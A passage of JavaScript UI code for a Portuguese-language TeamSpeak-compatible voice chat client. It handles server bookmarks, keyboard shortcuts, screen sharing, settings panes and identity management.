        '<label>Nome:</label><input type="text" class="f-name" maxlength="60" data-focus data-no-enter="1">' +
        '<label>Endereço:</label><input type="text" class="f-host" maxlength="255" placeholder="exemplo.com ou 127.0.0.1:9987" spellcheck="false" data-no-enter="1">' +
        '<label>Apelido:</label><input type="text" class="f-nick" maxlength="30" spellcheck="false" data-no-enter="1">' +
        '<label>Canal padrão:</label><input type="text" class="f-chan" maxlength="255" placeholder="(opcional)" spellcheck="false" data-no-enter="1">' +
        '<label>Identidade:</label><select class="f-ident"></select>' +
        '</div><div class="set-row wrap" style="margin-top:12px"><button type="button" class="btn f-new">Novo</button><button type="button" class="btn f-save">Salvar</button><button type="button" class="btn f-del">Excluir</button><button type="button" class="btn f-go">Conectar</button><button type="button" class="btn f-gotab" title="Conecta sem sair do servidor atual">Em nova aba</button></div>' +
        '</div></div>',
      onClose: () => { bookmarkDlg = null; },
      onOpen: (d) => {
        const fill = () => {
          const b = (state.bookmarks || []).find((x) => x.id === sel) || { name: '', host: '', nickname: state.self.nickname || '', defaultChannel: '', identityId: '' };
          d.q('.f-name').value = b.name || '';
          d.q('.f-host').value = b.host || '';
          d.q('.f-nick').value = b.nickname || '';
          d.q('.f-chan').value = b.defaultChannel || '';
          fillIdentitySelect(d.q('.f-ident'), b.identityId || '');
        };
        d.refresh = () => {
          const list = state.bookmarks || [];
          if (list.some((b) => b.id === justSaved)) justSaved = '';
          if (sel && sel !== justSaved && !list.some((b) => b.id === sel)) sel = '';
          const html = list.length
            ? list.map((b) => `<div class="list-item${b.id === sel ? ' selected' : ''}" data-id="${esc(b.id)}">${icon('star', 'fb-ic dir')}<span class="t">${esc(b.name || b.host)}</span></div>`).join('')
            : '<div class="list-empty">Nenhum favorito ainda.</div>';
          const box = d.q('.bm-list');
          if (box.dataset.html !== html) { box.dataset.html = html; box.innerHTML = html; }
          d.q('.f-del').disabled = !sel;
          d.q('.f-go').disabled = !sel;
          d.q('.f-gotab').disabled = !sel;
          d.q('.f-gotab').hidden = state.status === 'disconnected'; // aba parada: "Conectar" já não tira ninguém de servidor nenhum
        };
        d.q('.bm-list').addEventListener('click', (e) => {
          const it = e.target.closest('.list-item');
          if (!it) return;
          sel = it.dataset.id;
          d.setError('');
          d.refresh();
          fill();
        });
        d.q('.bm-list').addEventListener('dblclick', (e) => {
          const it = e.target.closest('.list-item');
          if (it) { d.close(); run('ConnectBookmark', [it.dataset.id]); }
        });
        d.q('.f-new').addEventListener('click', () => { sel = ''; d.setError(''); d.refresh(); fill(); d.q('.f-name').focus(); });
        d.q('.f-save').addEventListener('click', async () => {
          const b = { id: sel, name: d.q('.f-name').value.trim(), host: d.q('.f-host').value.trim(), nickname: d.q('.f-nick').value.trim(), defaultChannel: d.q('.f-chan').value.trim(), identityId: d.q('.f-ident').value || '' };
          if (!b.host) { d.setError('Informe o endereço do servidor.'); d.q('.f-host').focus(); return; }
          if (!b.name) b.name = b.host;
          d.setError('');
          try {
            const id = await call('SaveBookmark', b);
            if (id) { sel = String(id); justSaved = sel; }
            d.refresh();
          } catch (e) { d.setError(errText(e)); }
        });
        d.q('.f-del').addEventListener('click', async () => {
          if (!sel) return;
          const b = (state.bookmarks || []).find((x) => x.id === sel);
          const ok = await askConfirm({ title: 'Excluir favorito', text: 'Excluir "' + ((b && (b.name || b.host)) || '') + '" dos favoritos?', okLabel: 'Excluir', danger: true });
          if (!ok) return;
          try { await call('DeleteBookmark', sel); sel = ''; fill(); d.refresh(); } catch (e) { d.setError(errText(e)); }
        });
        d.q('.f-go').addEventListener('click', () => { if (sel) { const id = sel; d.close(); run('ConnectBookmark', [id]); } });
        d.q('.f-gotab').addEventListener('click', () => { if (sel) { const id = sel; d.close(); run('ConnectBookmarkNewTab', [id]); } });
        d.el.querySelector('.dlg-form').addEventListener('keydown', (e) => {
          if (e.key === 'Enter' && !e.isComposing) { e.preventDefault(); d.q('.f-save').click(); }
        });
        const first = (state.bookmarks || [])[0];
        if (first) sel = first.id;
        d.refresh();
        fill();
      },
    });
    return bookmarkDlg;
  }

  // ------------------------------------------------------------------ atalhos de teclado
  const MOD_SYMBOL = { Ctrl: '⌃', Alt: '⌥', Shift: '⇧', Cmd: '⌘' };
  const KEY_NAME = {
    Space: 'Espaço', Backquote: '`', Minus: '-', Equal: '=', BracketLeft: '[', BracketRight: ']', Backslash: '\\', Semicolon: ';', Quote: "'",
    Comma: ',', Period: '.', Slash: '/', ArrowUp: '↑', ArrowDown: '↓', ArrowLeft: '←', ArrowRight: '→', Enter: 'Enter', Tab: 'Tab',
    Backspace: '⌫', Delete: 'Del', Escape: 'Esc', CapsLock: 'Caps Lock', Home: 'Home', End: 'End', PageUp: 'Page Up', PageDown: 'Page Down',
    IntlBackslash: '§', NumpadEnter: 'Num Enter', NumpadAdd: 'Num +', NumpadSubtract: 'Num -', NumpadMultiply: 'Num *', NumpadDivide: 'Num /', NumpadDecimal: 'Num .',
  };
  function prettyCombo(combo) {
    if (!combo) return '';
    const parts = String(combo).split('+');
    const code = parts.pop();
    let key = KEY_NAME[code];
    if (!key) key = /^Key[A-Z]$/.test(code) ? code.slice(3) : /^Digit\d$/.test(code) ? code.slice(5) : /^Numpad\d$/.test(code) ? 'Num ' + code.slice(6) : code;
    // No macOS, os símbolos das teclas (⌃⌥⇧⌘); nos outros sistemas, os nomes por extenso.
    if (state.platform && state.platform !== 'darwin') {
      const names = { Cmd: 'Win' };
      const keys = { Backspace: 'Backspace', IntlBackslash: '\\' };
      return parts.map((m) => (names[m] || m) + '+').join('') + (keys[code] || key);
    }
    return parts.map((m) => MOD_SYMBOL[m] || m).join('') + (parts.length ? ' ' : '') + key;
  }
  function comboFromEvent(e) {
    const mods = [];
    if (e.ctrlKey) mods.push('Ctrl');
    if (e.altKey) mods.push('Alt');
    if (e.shiftKey) mods.push('Shift');
    if (e.metaKey) mods.push('Cmd');
    return mods.concat([e.code]).join('+');
  }
  const isModifierKey = (e) => /^(Shift|Control|Alt|Meta|OS)(Left|Right)?$/.test(e.code) || ['Shift', 'Control', 'Alt', 'Meta'].includes(e.key);

  const HOTKEY_ACTIONS = [['ptt', 'Apertar para falar'], ['toggleMute', 'Mutar/desmutar microfone'], ['toggleDeafen', 'Mutar/desmutar alto-falantes'], ['soundStop', 'Parar o soundboard']];
  let hkCapture = null; // { done(combo), cancel() } enquanto espera a combinação

  // opts.current: atalho atual (mostra o botão de remover); opts.report(erro):
  // chamado ao terminar, com o texto do erro ou '' (padrão: aviso nos Ajustes).
  function captureHotkey(action, label, opts) {
    opts = opts || {};
    const report = opts.report || ((err) => setSettingsNote(err, ''));
    let applied = false;
    const apply = (combo) => {
      applied = true;
      dlg.close();
      call('SetHotkey', action, combo).then(() => report(''), (e) => report(errText(e)));
    };
    const buttons = [{ label: 'Cancelar', action: (d) => d.close() }];
    if (opts.current) buttons.unshift({ label: 'Remover atalho', key: 'hk-remove', action: () => apply('') });
    const dlg = openDialog({
      title: 'Definir atalho',
      cls: 'small',
      body: `<div class="hk-wait">Pressione a combinação de teclas para<br><b>${esc(label)}</b>` +
        (opts.current ? `<br><span class="muted-text small">atual: ${esc(prettyCombo(opts.current))}</span>` : '') +
        '<br><kbd>Esc cancela</kbd></div>',
      buttons,
      onClose: () => { hkCapture = null; if (!applied && opts.report) opts.report(''); },
    });
    hkCapture = {
      cancel: () => dlg.close(),
      done: (combo) => apply(combo),
    };
  }

  // Sem atalhos globais (state.hotkeys.global = false) os atalhos valem só com a janela em foco.
  let pttHeld = false;
  function releasePTT() { if (pttHeld) { pttHeld = false; quiet('SetPTT', false); } }
  function onHotkeyDown(e) {
    const hk = state.hotkeys;
    if (!hk || hk.global) return;
    const plain = !e.ctrlKey && !e.altKey && !e.metaKey && !/^F\d+$/.test(e.code);
    if (plain && e.target && e.target.closest && e.target.closest('input, textarea, select')) return; // está digitando
    const combo = comboFromEvent(e);
    if (state.audio.vadMode === 'ptt' && hk.ptt && combo === hk.ptt) {
      e.preventDefault();
      if (!pttHeld && !e.repeat) { pttHeld = true; quiet('SetPTT', true); }
      return;
    }
    if (e.repeat) return;
    if (hk.toggleMute && combo === hk.toggleMute) { e.preventDefault(); run('ToggleMute'); }
    else if (hk.toggleDeafen && combo === hk.toggleDeafen) { e.preventDefault(); run('ToggleDeafen'); }
    else if (hk.soundStop && combo === hk.soundStop) { e.preventDefault(); run('SoundboardStop'); }
    else {
      const snd = (state.audio.sounds || []).find((x) => x.hotkey && x.hotkey === combo);
      if (snd) { e.preventDefault(); run('SoundboardPlay', [snd.id]); }
    }
  }
  function onHotkeyUp(e) {
    if (!pttHeld) return;
    const code = String((state.hotkeys && state.hotkeys.ptt) || '').split('+').pop();
    if (!code || e.code === code) releasePTT();
  }

  // ------------------------------------------------------------------ compartilhamento de tela
  function renderScreen() {
    const scr = window.FuritoScreen;
    const on = state.status === 'connected';
    const sh = scr.sharing();
    $('tbScreen').disabled = !on && !sh; // dá para parar daqui a transmissão que está em outra aba
    $('tbScreen').classList.toggle('active', !!sh);
    $('tbScreen').title = sh ? 'Parar de compartilhar a tela' : 'Compartilhar tela';
    const ind = $('screenIndicator');
    ind.hidden = !sh;
    if (sh) {
      // a transmissão é da aba em que começou: olhando outra, o indicador diz onde ela está
      const where = sh.here === false ? ' em ' + esc(tabName(findTab(sh.tab)) || 'outra aba') : '';
      const html = icon('screen') + '<span>Compartilhando a tela' + where + ' · ' + (sh.viewers === 0 ? 'ninguém assistindo' : sh.viewers === 1 ? '1 assistindo' : sh.viewers + ' assistindo') + ' ✕</span>';
      if (ind.dataset.html !== html) { ind.dataset.html = html; ind.innerHTML = html; }
    }
    const w = scr.watching();
    const view = $('screenView');
    if (view.hidden === !!w) {
      view.hidden = !w;
      if (!w) view.classList.remove('max');
    }
    if (w) {
      $('svTitle').textContent = 'Tela de ' + w.name;
      $('svState').textContent = w.state === 'live' ? '' : w.state === 'connecting' ? '· conectando…' : '· pedindo…';
      $('svMax').textContent = view.classList.contains('max') ? 'Sair da tela cheia' : 'Tela cheia';
    }
  }
  // screen.js avisa quando algo mudou (alguém começou a compartilhar, um
  // espectador entrou…): redesenha os ícones da árvore e os indicadores.
  let screenRedraw = 0;
  function onScreenChanged() {
    if (screenRedraw) return;
    screenRedraw = setTimeout(() => { screenRedraw = 0; renderTree(); renderScreen(); }, 0);
  }

  // O vídeo vai direto de um computador ao outro: os dois lados podem ver o
  // endereço IP um do outro. Avisa uma vez, antes do primeiro uso.
  async function screenWarningOk() {
    const sc = state.screen || {};
    if (sc.warned || sc.relayOnly) return true;
    const ok = await askConfirm({
      title: 'Compartilhamento de tela',
      text: 'O vídeo vai direto do computador de quem compartilha para o de quem assiste, sem passar pelo servidor TeamSpeak. Por isso, quem assiste e quem compartilha podem descobrir o endereço IP um do outro. Use só com pessoas em quem você confia — ou configure um servidor de retransmissão em Ajustes → Compartilhamento de tela para esconder o IP.',
      okLabel: 'Entendi, continuar',
    });
    if (ok) await call('AcceptScreenWarning').catch(() => {});
    return ok;
  }

  async function watchScreen(clientId) {
    const w = window.FuritoScreen.watching();
    if (w && w.from === clientId) return;
    if (!(await screenWarningOk())) return;
    try { await window.FuritoScreen.watch(clientId); } catch (e) { localLine('error', 'Não foi possível assistir à tela: ' + errText(e)); }
  }

  async function shareScreenDialog() {
    if (state.status !== 'connected' || window.FuritoScreen.sharing()) return;
    if (!(await screenWarningOk())) return;
    const native = !!(state.screen || {}).nativeCapture;
    let displays = [];
    if (native) { try { displays = (await call('ScreenDisplays')) || []; } catch (e) { displays = []; } }
    openDialog({
      title: 'Compartilhar tela',
      cls: 'small',
      body: '<div class="dlg-form">' +
        (native && displays.length > 1 ? '<label>Tela:</label><select class="f-display">' + displays.map((d) => `<option value="${Number(d.id)}"${d.main ? ' selected' : ''}>${esc(d.name)}</option>`).join('') + '</select>' : '') +
        '<label>Qualidade:</label><select class="f-quality"><option value="1080">1080p (mais nítido)</option><option value="720">720p (mais leve)</option></select>' +
        '<label>Quadros por segundo:</label><select class="f-fps"><option value="15">15 (recomendado)</option><option value="30">30 (mais fluido)</option><option value="5">5 (conexão fraca)</option></select>' +
        '</div><div class="muted-text small" style="margin-top:8px">' +
        (native ? 'Quem está no canal com o Furito TS pode assistir. Na primeira vez o macOS pede a permissão de gravação de tela.' : 'Quem está no canal com o Furito TS pode assistir. O sistema vai perguntar qual tela ou janela mostrar.') +
        '</div>',
      buttons: [
        { label: 'Cancelar', action: (d) => d.close() },
        { label: 'Compartilhar', primary: true, action: async (d) => {
          const sel = d.q('.f-display');
          const opts = { quality: Number(d.q('.f-quality').value), fps: Number(d.q('.f-fps').value), displayId: sel ? Number(sel.value) : 0 };
          d.setError('');
          d.setBusy(true);
          try {
            await window.FuritoScreen.start(opts);
            d.close();
          } catch (e) {
            d.setBusy(false);
            d.setError(errText(e));
          }
        } },
      ],
    });
  }

  function bindScreen() {
    const scr = window.FuritoScreen;
    scr.init({ call, forTab: (id) => bridge.forTab(id), getState: () => state, notify: (level, text) => localLine(level, text), changed: onScreenChanged });
    scr.attachVideo($('svVideo'));
    $('tbScreen').addEventListener('click', () => { if (scr.sharing()) scr.stop(); else shareScreenDialog(); });
    $('screenIndicator').addEventListener('click', () => scr.stop());
    $('svClose').addEventListener('click', () => scr.stopWatching());
    const toggleMax = () => {
      const view = $('screenView');
      view.classList.toggle('max');
      if (view.classList.contains('max')) { view.dataset.dx = view.dataset.dy = '0'; view.style.transform = ''; }
      renderScreen();
    };
    $('svMax').addEventListener('click', toggleMax);
    $('svVideo').addEventListener('dblclick', toggleMax);
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && $('screenView').classList.contains('max') && !openModals.length) { $('screenView').classList.remove('max'); renderScreen(); }
    });
    $('setScreenSave').addEventListener('click', async () => {
      try {
        await call('SetScreenSettings', $('setStun').value.trim(), $('setTurn').value.trim(), $('setTurnUser').value.trim(), $('setTurnPass').value, $('setRelayOnly').checked);
        $('setTurnPass').value = '';
        setSettingsNote('', 'Ajustes do compartilhamento de tela salvos.');
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
  }

  // ------------------------------------------------------------------ ajustes
  let settingsOpen = false;
  function setSettingsNote(error, info) {
    $('setError').textContent = error || '';
    $('setInfo').textContent = error ? '' : (info || '');
  }
  function setSettingsBusy(b) {
    $('setSpinner').hidden = !b;
    settingsBusy = !!b;
    ['setImprove', 'setExport', 'setImport', 'setPrivKey', 'setIdNew'].forEach((id) => { $(id).disabled = !!b; });
    renderIdentities();
  }

  // Identidade selecionada na lista dos Ajustes ('' = a em uso).
  let setIdSel = '';
  let settingsBusy = false;
  function selectedIdentity() {
    const list = state.identities || [];
    return list.find((x) => x.id === setIdSel) || list.find((x) => x.inUse) || list[0] || null;
  }
  function renderIdentities() {
    const list = state.identities || [];
    const cur = selectedIdentity();
    const html = list.length ? list.map((x) =>
      `<div class="list-item${cur && x.id === cur.id ? ' selected' : ''}" data-id="${esc(x.id)}">${icon('lock', 'fb-ic')}<span class="t">${esc(x.name)}</span>` +
      (x.nickname ? `<span class="id-nick">· ${esc(x.nickname)}</span>` : '') +
      (x.isDefault ? '<span class="id-badge">padrão</span>' : '') +
      (x.inUse ? '<span class="id-badge use">em uso</span>' : '') +
      `<span class="id-level">nível ${Number(x.securityLevel) || 0}</span></div>`).join('')
      : '<div class="list-empty">Nenhuma identidade.</div>';
    const box = $('setIdList');
    if (box.dataset.html !== html) { box.dataset.html = html; box.innerHTML = html; }
    $('setUid').textContent = cur ? cur.uid : '—';
    $('setLevel').textContent = cur ? String(cur.securityLevel) : '—';
    const srv = cur && cur.inUse ? (state.identity || {}).serverUid : '';
    $('setSrvUid').textContent = srv || '';
    $('setSrvUid').hidden = $('setSrvUidLbl').hidden = !srv;
    $('setIdEdit').disabled = $('setExport').disabled = $('setImprove').disabled = settingsBusy || !cur;
    $('setIdDefault').disabled = settingsBusy || !cur || cur.isDefault;
    $('setIdDelete').disabled = settingsBusy || !cur || list.length < 2;
  }

  // ------------------------------------------------------------------ sobre
  const PLATFORM_NAME = { darwin: 'macOS', windows: 'Windows', linux: 'Linux' };
  function openAbout() {
    const where = PLATFORM_NAME[state.platform] || '';
    $('aboutVersion').textContent = 'Versão ' + (state.appVersion || '—') + (where ? ' para ' + where : '');
    const site = state.appSite ? linkHtml(state.appSite, esc(state.appSite.replace(/^https?:\/\//, '').replace(/\/$/, ''))) : '';
    $('aboutAuthor').innerHTML = state.appAuthor ? 'por ' + esc(state.appAuthor) + (site ? ' · ' + site : '') : site;
    openModal($('dlgAbout'));
  }
  function closeAbout() { closeModal($('dlgAbout')); }

  // Os Ajustes têm uma aba por assunto. A janela abre na última aba usada, a
  // não ser que quem a abre peça uma (pane).
  const SETTINGS_PANES = ['audio', 'hotkeys', 'connection', 'privacy', 'screen', 'identities'];
  let settingsPane = SETTINGS_PANES.includes(loadPrefs().settingsPane) ? loadPrefs().settingsPane : 'audio';
  function showSettingsPane(name, focus) {
    if (!SETTINGS_PANES.includes(name)) name = 'audio';
    if (name !== settingsPane) { settingsPane = name; savePrefs({ settingsPane: name }); setSettingsNote('', ''); }
    $('setTabs').querySelectorAll('.set-tab').forEach((tab) => {
      const on = tab.dataset.pane === name;
      tab.classList.toggle('active', on);
      tab.setAttribute('aria-selected', on ? 'true' : 'false');
      tab.tabIndex = on ? 0 : -1; // só a aba ativa entra na ordem do Tab; as setas andam entre elas
      if (on && focus) tab.focus();
    });
    $('dlgSettings').querySelectorAll('.set-pane').forEach((pane) => { pane.hidden = pane.dataset.pane !== name; });
    const body = $('dlgSettings').querySelector('.dlg-content');
    if (body) body.scrollTop = 0;
  }

  function openSettings(pane) {
    settingsOpen = true;
    setSettingsNote('', '');
    openModal($('dlgSettings'));
    showSettingsPane(typeof pane === 'string' ? pane : settingsPane);
    renderSettings(true);
  }
  function closeSettings() {
    settingsOpen = false;
    closeModal($('dlgSettings'));
  }

  function fillDeviceSelect(sel, devices, choice) {
    const list = devices || [];
    const sig = list.map((x) => x.name + (x.isDefault ? '*' : '')).join('|') + '#' + choice;
    if (sel.dataset.sig !== sig) {
      sel.dataset.sig = sig;
      let html = '<option value="">Padrão do sistema</option>' + list.map((x) => `<option value="${esc(x.name)}">${esc(x.name)}${x.isDefault ? ' (padrão)' : ''}</option>`).join('');
      if (choice && !list.some((x) => x.name === choice)) html += `<option value="${esc(choice)}">${esc(choice)} (desconectado)</option>`;
      sel.innerHTML = html;
    }
    if (document.activeElement !== sel) sel.value = choice || '';
  }

  function renderSettings(force) {
    if (!settingsOpen) return;
    const au = state.audio;
    fillDeviceSelect($('setIn'), au.inputDevices, au.inputChoice || '');
    fillDeviceSelect($('setOut'), au.outputDevices, au.outputChoice || '');
    $('setDevNote').hidden = !au.echoCancellation;
    const mode = au.vadMode === 'level' || au.vadMode === 'ptt' ? au.vadMode : 'auto';
    document.querySelectorAll('input[name="vadModeS"]').forEach((r) => { r.checked = r.value === mode; });

    const hk = state.hotkeys || {};
    const errs = hk.errors || {};
    const html = HOTKEY_ACTIONS.map(([action, label]) => {
      const combo = hk[action] || '';
      return `<div class="hk-row"><span>${esc(label)}</span><span class="hk-combo${combo ? '' : ' none'}">${combo ? esc(prettyCombo(combo)) : 'nenhum'}</span>` +
        `<button type="button" class="btn" data-hk="${action}">Definir…</button><button type="button" class="btn" data-hk-clear="${action}"${combo ? '' : ' disabled'}>Limpar</button>` +
        (errs[action] ? `<span class="hk-err">${esc(errs[action])}</span>` : '') + '</div>';
    }).join('');
    const rows = $('hkRows');
    if (rows.dataset.html !== html) { rows.dataset.html = html; rows.innerHTML = html; }
    $('hkNote').hidden = hk.global !== false;

    $('setReconnect').checked = !!state.autoReconnect;
    $('setPokePopup').checked = state.pokePopup !== false;
    $('setImages').value = (state.images || {}).mode || 'ask';
    const nick = $('setNick');
    if (force || document.activeElement !== nick) nick.value = state.self.nickname || '';
    renderIdentities();
    if (force) {
      const sc = state.screen || {};
      $('setStun').value = sc.stunUrl || '';
      $('setTurn').value = sc.turnUrl || '';
      $('setTurnUser').value = sc.turnUser || '';
      $('setTurnPass').value = '';
      $('setTurnPass').placeholder = sc.hasTurn ? '(mantida)' : 'senha';
      $('setRelayOnly').checked = !!sc.relayOnly;
    }
  }

  function bindSettings() {
    $('tbSettings').addEventListener('click', openSettings);
    $('tbAbout').addEventListener('click', openAbout);
    $('aboutClose').addEventListener('click', closeAbout);
    $('dlgAbout')._dismiss = closeAbout;
    $('tbScripts').addEventListener('click', openScripts);
    window.FuritoScripts.onChange(renderScriptsButton);
    $('cIdentity').addEventListener('change', onConnectIdentityChange);
    $('setClose').addEventListener('click', closeSettings);
    $('dlgSettings')._dismiss = closeSettings;
    $('setTabs').addEventListener('click', (e) => {
      const tab = e.target.closest('.set-tab');
      if (tab) showSettingsPane(tab.dataset.pane);
    });
    $('setTabs').addEventListener('keydown', (e) => {
      const i = SETTINGS_PANES.indexOf(settingsPane), n = SETTINGS_PANES.length;
      const to = e.key === 'ArrowRight' ? (i + 1) % n : e.key === 'ArrowLeft' ? (i + n - 1) % n : e.key === 'Home' ? 0 : e.key === 'End' ? n - 1 : -1;
      if (to < 0) return;
      e.preventDefault();
      showSettingsPane(SETTINGS_PANES[to], true);
    });
    // o resto dos ajustes de áudio mora no painel do microfone, que tem o medidor
    // (abre depois do clique terminar: o mesmo clique, visto pela página, fecharia o painel)
    $('setOpenCapture').addEventListener('click', () => { closeSettings(); setTimeout(() => showPopover($('popCapture'), $('tbCapture')), 0); });
    $('setIn').addEventListener('change', (e) => call('SetInputDevice', e.target.value).catch((err) => setSettingsNote(errText(err), '')));
    $('setOut').addEventListener('change', (e) => call('SetOutputDevice', e.target.value).catch((err) => setSettingsNote(errText(err), '')));
    document.querySelectorAll('input[name="vadModeS"]').forEach((r) => {
      r.addEventListener('change', () => { if (r.checked) run('SetVADMode', [r.value]); });
    });
    $('hkRows').addEventListener('click', (e) => {
      const set = e.target.closest('[data-hk]');
      const clear = e.target.closest('[data-hk-clear]');
      if (set) { const a = set.dataset.hk; captureHotkey(a, (HOTKEY_ACTIONS.find((x) => x[0] === a) || [a, a])[1]); }
      else if (clear) call('SetHotkey', clear.dataset.hkClear, '').then(() => setSettingsNote('', ''), (err) => setSettingsNote(errText(err), ''));
    });
    $('setReconnect').addEventListener('change', (e) => run('SetAutoReconnect', [e.target.checked]));
    $('setImages').addEventListener('change', (e) => run('SetRemoteImages', [e.target.value]));
    $('setPokePopup').addEventListener('change', (e) => run('SetPokePopup', [e.target.checked]));
    const applyNick = () => {
      const name = $('setNick').value.trim();
      if (name.length < 3) { setSettingsNote('O apelido precisa ter pelo menos 3 caracteres.', ''); return; }
      call('SetNickname', name).then(() => setSettingsNote('', 'Apelido alterado.'), (err) => setSettingsNote(errText(err), ''));
    };
    $('setNickApply').addEventListener('click', applyNick);
    $('setNick').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); applyNick(); } });

    $('setIdList').addEventListener('click', (e) => {
      const it = e.target.closest('.list-item');
      if (!it) return;
      setIdSel = it.dataset.id;
      setSettingsNote('', '');
      renderIdentities();
    });
    $('setIdNew').addEventListener('click', async () => {
      const name = await askText({ title: 'Nova identidade', text: 'Uma identidade nova é outra pessoa para os servidores: sem os grupos e permissões que a atual tem.', placeholder: 'Nome (só para esta lista)', okLabel: 'Criar', max: 40, emptyError: 'Informe um nome.' });
      if (name === null) return;
      try {
        const id = await call('CreateIdentity', name.trim());
        if (id) setIdSel = String(id);
        setSettingsNote('', 'Identidade criada. Para conectar com ela, torne-a padrão ou escolha-a na janela de conexão.');
        renderIdentities();
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
    $('setIdEdit').addEventListener('click', () => {
      const cur = selectedIdentity();
      if (!cur) return;
      openDialog({
        title: 'Renomear identidade',
        cls: 'small',
        body: '<div class="dlg-form">' +
          '<label>Nome:</label><input type="text" class="f-name" maxlength="40" data-focus>' +
          '<label>Apelido sugerido:</label><input type="text" class="f-nick" maxlength="30" spellcheck="false" placeholder="(opcional)">' +
          '</div>',
        buttons: [
          { label: 'Cancelar', action: (d) => d.close() },
          { label: 'Salvar', primary: true, action: async (d) => {
            const name = d.q('.f-name').value.trim();
            if (!name) { d.setError('Informe um nome.'); d.q('.f-name').focus(); return; }
            try {
              await call('UpdateIdentity', cur.id, name, d.q('.f-nick').value.trim());
              d.close();
              setSettingsNote('', '');
            } catch (err) { d.setError(errText(err)); }
          } },
        ],
        onOpen: (d) => { d.q('.f-name').value = cur.name || ''; d.q('.f-nick').value = cur.nickname || ''; },
      });
    });
    $('setIdDefault').addEventListener('click', async () => {
      const cur = selectedIdentity();
      if (!cur) return;
      try {
        await call('SetDefaultIdentity', cur.id);
        setSettingsNote('', state.status === 'disconnected'
          ? '"' + cur.name + '" é a identidade padrão.'
          : '"' + cur.name + '" é a identidade padrão; vale a partir da próxima conexão.');
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
    $('setIdDelete').addEventListener('click', async () => {
      const cur = selectedIdentity();
      if (!cur) return;
      const ok = await askConfirm({ title: 'Apagar identidade', text: 'Apagar a identidade "' + cur.name + '"? A chave some deste computador: os servidores deixam de reconhecer você por ela, e não há como recuperá-la sem uma cópia exportada.', okLabel: 'Apagar', danger: true });
      if (!ok) return;
      try {
        await call('DeleteIdentity', cur.id);
        setIdSel = '';
        setSettingsNote('', 'Identidade apagada.');
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
    $('setImprove').addEventListener('click', async () => {
      const target = selectedIdentity();
      if (!target) return;
      const cur = Number(target.securityLevel) || 0;
      const v = await askText({ title: 'Aumentar nível de segurança', text: 'Nível atual de "' + target.name + '": ' + cur + '. Informe o nível desejado. Cada nível a mais dobra o tempo de cálculo; acima de 28 pode levar muitos minutos.', value: String(cur + 1), okLabel: 'Aumentar', max: 3 });
      if (v === null) return;
      const level = parseInt(v, 10);
      if (!(level > cur) || level > 64) { setSettingsNote('Informe um nível maior que o atual.', ''); return; }
      setSettingsNote('', 'Calculando… isso pode demorar.');
      setSettingsBusy(true);
      try {
        const got = await call('ImproveIdentity', target.id, level);
        setSettingsNote('', 'Nível de segurança agora: ' + got + '.');
      } catch (err) { setSettingsNote(errText(err), ''); }
      setSettingsBusy(false);
    });
    $('setExport').addEventListener('click', async () => {
      const cur = selectedIdentity();
      if (!cur) return;
      try {
        const path = await call('ExportIdentity', cur.id);
        setSettingsNote('', path ? 'Identidade exportada para ' + path : '');
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
    $('setImport').addEventListener('click', async () => {
      const ok = await askConfirm({ title: 'Importar identidade', text: 'Aceita o arquivo .ini exportado pelo TeamSpeak 3 (Ferramentas → Identidades → Exportar) ou uma identidade exportada por este app. Ela entra na lista; as que já existem continuam lá.', okLabel: 'Escolher arquivo…' });
      if (!ok) return;
      try {
        const id = await call('ImportIdentity');
        if (!id) { setSettingsNote('', ''); return; }
        setIdSel = String(id);
        const now = (((await call('GetState')) || {}).identities || []).find((x) => x.id === id) || {};
        setSettingsNote('', 'Identidade importada' + (now.uid ? ': "' + now.name + '" (UID ' + now.uid + ', nível ' + now.securityLevel + ')' : '') + '.');
        renderIdentities();
        const use = await askConfirm({ title: 'Usar esta identidade?', text: 'Tornar "' + (now.name || 'a identidade importada') + '" a identidade padrão? ' + (state.status === 'disconnected' ? 'As próximas conexões usarão ela.' : 'Vale a partir da próxima conexão.'), okLabel: 'Tornar padrão', cancelLabel: 'Agora não' });
        if (use) await call('SetDefaultIdentity', id);
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
    $('setPrivKey').addEventListener('click', async () => {
      const key = await askText({ title: 'Chave de privilégio', text: 'Cole a chave de privilégio (token) recebida do administrador do servidor.', placeholder: 'chave', okLabel: 'Usar', max: 120 });
      if (key === null) return;
      try {
        await call('UsePrivilegeKey', key.trim());
        setSettingsNote('', 'Chave de privilégio enviada ao servidor.');
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
    $('setClearHistory').addEventListener('click', async () => {
      const ok = await askConfirm({ title: 'Apagar histórico', text: 'Apagar todo o histórico de conversas salvo neste computador?', okLabel: 'Apagar', danger: true });
      if (!ok) return;
      try {
        await call('ClearHistory');
        for (const t of tabs.values()) { t.view.querySelectorAll('.line.hist, .hist-sep').forEach((x) => x.remove()); t.hasHist = false; }
        setSettingsNote('', 'Histórico apagado.');
      } catch (err) { setSettingsNote(errText(err), ''); }
    });
  }

  // ------------------------------------------------------------------ arrastar cliente para um canal
  let dropTargetId = 0; // canal sob o cursor enquanto um cliente é arrastado
  function applyDropTarget() {
    const tree = $('tree');
    tree.querySelectorAll('.row.drop-target').forEach((r) => { if (Number(r.dataset.id) !== dropTargetId) r.classList.remove('drop-target'); });
    if (!dropTargetId) return;
    const row = tree.querySelector(`.row.channel[data-id="${dropTargetId}"]`);
    if (row) row.classList.add('drop-target');
  }

  function bindClientDrag(tree) {
    let drag = null; // { id, name, x, y, active, ghost }
    tree.addEventListener('mousedown', (e) => {
      if (e.button !== 0 || state.status !== 'connected') return;
      const row = e.target.closest('.row.client');
      if (!row) return;
      const cl = findClient(Number(row.dataset.id));
      if (cl) drag = { id: cl.id, name: cl.nickname, x: e.clientX, y: e.clientY, active: false, ghost: null };
    });
    document.addEventListener('mousemove', (e) => {
      if (!drag) return;
      if (!drag.active) {
        if (Math.abs(e.clientX - drag.x) + Math.abs(e.clientY - drag.y) < 6) return;
        drag.active = true;
        drag.ghost = document.createElement('div');
        drag.ghost.className = 'drag-ghost';
        drag.ghost.textContent = drag.name;
        document.body.appendChild(drag.ghost);
        document.body.classList.add('dragging-client');
      }
      drag.ghost.style.left = (e.clientX + 12) + 'px';
      drag.ghost.style.top = (e.clientY + 10) + 'px';
      const el = document.elementFromPoint(e.clientX, e.clientY);
